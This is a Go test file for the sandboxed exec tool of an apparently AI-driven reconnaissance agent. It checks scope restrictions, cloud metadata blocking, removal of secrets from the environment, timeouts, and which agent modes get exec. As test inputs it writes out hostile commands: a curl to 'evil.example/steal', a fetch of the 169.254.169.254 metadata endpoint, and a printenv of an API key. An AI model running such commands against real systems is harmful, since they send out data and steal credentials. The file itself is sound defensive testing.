package agent

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	osexec "os/exec"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/recon-platform/internal/config"
)

func TestHostsInCommand(t *testing.T) {
	cases := []struct {
		cmd  string
		want []string
		none bool
	}{
		{cmd: "echo hello", none: true},
		{cmd: "cat /tmp/package.json", none: true},
		{cmd: "ls nuclei-templates", none: true},
		{cmd: "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest", none: true},
		{cmd: "curl https://evil.example/steal", want: []string{"evil.example"}},
		{cmd: "nmap -Pn 8.8.8.8", want: []string{"8.8.8.8"}},
		{cmd: "httpx -u https://app.example.test/login", want: []string{"app.example.test"}},
		{cmd: "curl app.example.test/robots.txt", want: []string{"app.example.test"}},
		{cmd: "curl http://169.254.169.254/latest/meta-data/", want: []string{"169.254.169.254"}},
	}
	for _, tc := range cases {
		got := hostsInCommand(tc.cmd)
		if tc.none {
			if len(got) != 0 {
				t.Errorf("%q hosts=%v want none", tc.cmd, got)
			}
			continue
		}
		if len(got) != len(tc.want) {
			t.Errorf("%q hosts=%v want %v", tc.cmd, got, tc.want)
			continue
		}
		for i := range tc.want {
			if got[i] != tc.want[i] {
				t.Errorf("%q hosts=%v want %v", tc.cmd, got, tc.want)
			}
		}
	}
}

func TestExecEcho(t *testing.T) {
	db := testDB(t)
	tb := NewToolbox(db, nil, nil)
	tid := insertTarget(t, db)
	res := tb.Dispatch(context.Background(), tid, "exec", `{"command":"echo agent-exec-ok"}`)
	var out struct {
		Exit   int    `json:"exit"`
		Output string `json:"output"`
	}
	if err := json.Unmarshal([]byte(res.JSON), &out); err != nil {
		t.Fatal(res.JSON)
	}
	if out.Exit != 0 || !strings.Contains(out.Output, "agent-exec-ok") {
		t.Fatalf("got %+v", out)
	}
}

func TestExecRejectsOutOfScopeHost(t *testing.T) {
	db := testDB(t)
	tb := NewToolbox(db, nil, nil)
	tid := insertTarget(t, db)
	res := tb.Dispatch(context.Background(), tid, "exec", `{"command":"curl -s https://evil.example/steal"}`)
	if !strings.Contains(res.JSON, "not in scope") && !strings.Contains(res.JSON, "exec host") {
		t.Fatalf("got %s", res.JSON)
	}
}

func TestExecRejectsMetadata(t *testing.T) {
	db := testDB(t)
	tb := NewToolbox(db, nil, nil)
	tid := insertTarget(t, db)
	res := tb.Dispatch(context.Background(), tid, "exec", `{"command":"curl -s http://169.254.169.254/latest/meta-data/"}`)
	if !strings.Contains(res.JSON, "metadata") {
		t.Fatalf("got %s", res.JSON)
	}
}

func TestExecAllowsInScopeCurl(t *testing.T) {
	if _, err := osexec.LookPath("curl"); err != nil {
		t.Skip("curl not installed")
	}
	db := testDB(t)
	tb := NewToolbox(db, nil, nil)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("in-scope-body"))
	}))
	t.Cleanup(srv.Close)
	u, _ := url.Parse(srv.URL)
	tid := uuid.New().String()
	if _, err := db.Exec(`INSERT INTO targets (id, domain, priority) VALUES (?,?, 'medium')`, tid, u.Hostname()); err != nil {
		t.Fatal(err)
	}
	raw, _ := json.Marshal(map[string]string{"command": "curl -sS " + srv.URL})
	res := tb.Dispatch(context.Background(), tid, "exec", string(raw))
	var out struct {
		Exit   int    `json:"exit"`
		Output string `json:"output"`
	}
	if err := json.Unmarshal([]byte(res.JSON), &out); err != nil {
		t.Fatal(res.JSON)
	}
	if out.Exit != 0 || !strings.Contains(out.Output, "in-scope-body") {
		t.Fatalf("got %+v json=%s", out, res.JSON)
	}
}

func TestExecStripsSecretEnv(t *testing.T) {
	t.Setenv("AI_API_KEY", "super-secret-litellm-key")
	db := testDB(t)
	tb := NewToolbox(db, nil, nil)
	tid := insertTarget(t, db)
	res := tb.Dispatch(context.Background(), tid, "exec", `{"command":"printenv AI_API_KEY || true"}`)
	if strings.Contains(res.JSON, "super-secret-litellm-key") {
		t.Fatalf("secret leaked: %s", res.JSON)
	}
}

func TestExecTimeout(t *testing.T) {
	db := testDB(t)
	tb := NewToolbox(db, nil, nil)
	tb.cfg = &config.Config{AIExecEnabled: true, AIExecTimeoutSeconds: 1}
	tid := insertTarget(t, db)
	start := time.Now()
	res := tb.Dispatch(context.Background(), tid, "exec", `{"command":"sleep 8"}`)
	if time.Since(start) > 4*time.Second {
		t.Fatalf("timeout too slow: %s", time.Since(start))
	}
	if !strings.Contains(res.JSON, "timeout") && !strings.Contains(res.JSON, "timed out") {
		t.Fatalf("got %s", res.JSON)
	}
}

func TestExecDisabled(t *testing.T) {
	db := testDB(t)
	tb := NewToolbox(db, nil, nil)
	tb.cfg = &config.Config{AIExecEnabled: false}
	tid := insertTarget(t, db)
	res := tb.Dispatch(context.Background(), tid, "exec", `{"command":"echo hi"}`)
	if !strings.Contains(res.JSON, "disabled") {
		t.Fatalf("got %s", res.JSON)
	}
}

func TestExecDeniedToHunter(t *testing.T) {
	db := testDB(t)
	tb := NewToolbox(db, nil, nil)
	tid := insertTarget(t, db)
	res := tb.Dispatch(context.Background(), tid, "exec", `{"command":"echo hi"}`, CallEnv{Mode: modeAlwaysOn})
	if !strings.Contains(res.JSON, "hunter") {
		t.Fatalf("got %s", res.JSON)
	}
}

func TestExecRejectsDataCwd(t *testing.T) {
	db := testDB(t)
	tb := NewToolbox(db, nil, nil)
	tid := insertTarget(t, db)
	raw, _ := json.Marshal(map[string]string{"command": "pwd", "cwd": "/data"})
	res := tb.Dispatch(context.Background(), tid, "exec", string(raw))
	if !strings.Contains(res.JSON, "/data") {
		t.Fatalf("got %s", res.JSON)
	}
}

func TestExecNotInHunterToolDefs(t *testing.T) {
	defs := toolDefsFor(true, false)
	for _, d := range defs {
		if d.Name == "exec" {
			t.Fatal("hunter must not receive exec")
		}
	}
	defs = toolDefsFor(false, true)
	found := false
	for _, d := range defs {
		if d.Name == "exec" {
			found = true
		}
	}
	if !found {
		t.Fatal("copilot must receive exec")
	}
}
